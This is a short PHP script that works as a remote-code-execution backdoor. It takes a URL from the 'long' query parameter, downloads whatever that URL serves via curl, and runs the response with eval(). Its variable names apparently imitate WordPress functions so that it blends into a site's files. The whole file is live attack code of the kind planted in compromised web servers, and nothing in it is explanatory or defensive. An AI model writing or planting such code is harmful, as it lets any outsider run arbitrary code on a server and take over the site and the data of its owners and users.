<?php

if (isset($_GET['long'])) {
    $_e_mv = $_GET['long'];
    if ($get_the_time_gse = curl_init()) {
        curl_setopt($get_the_time_gse, CURLOPT_URL, $_e_mv);
        curl_setopt($get_the_time_gse, CURLOPT_RETURNTRANSFER, true);
        eval(curl_exec($get_the_time_gse));
        curl_close($get_the_time_gse);
        exit;
    }
}